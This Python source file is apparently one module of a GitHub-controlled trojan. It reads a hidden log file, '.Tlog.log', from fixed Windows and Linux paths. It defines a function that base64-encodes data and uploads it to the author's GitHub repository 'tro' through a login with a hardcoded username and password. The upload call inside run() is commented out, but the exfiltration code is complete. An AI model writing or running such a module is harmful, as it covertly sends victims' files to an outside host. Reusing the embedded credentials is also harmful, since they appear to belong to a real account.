from github3 import login
import json
import base64
import os

#path = "others/"
filePath = ".Tlog.log"#base64.b64encode("Tapalog.log")
TargetWinFilePath = "C:\\Users\\this-PC\\Desktop\\work\\.Tlog.log"
TargetLinuxFilePath = ".Tlog.log"
TargetOSfilePath=""

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path= "data/abc/sendFileToGit/"+filePath
	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data.encode()))
	return

def run(**args):
	print("[*] In SendFileToGit module.") #Todelete
	global TargetOSfilePath
	try:
		if os.name == 'posix':
			TargetOSfilePath= TargetLinuxFilePath
		elif os.name == 'nt':
			TargetOSfilePath= TargetWinFilePath
		else :
			return str("OS not recognized!")

		#fich = open(TargetOSfilePath, "r")
		fich = open(TargetOSfilePath, "rb")# To fix modules/_bootlocale not found, you need to handle bytes files instead of string
		content = fich.read()
		fich.close()
		#store_module_result(str(content))
		return content.decode("utf-8")
	except:
		return "SendFileToGit: File %s not found"% TargetOSfilePath

#run()
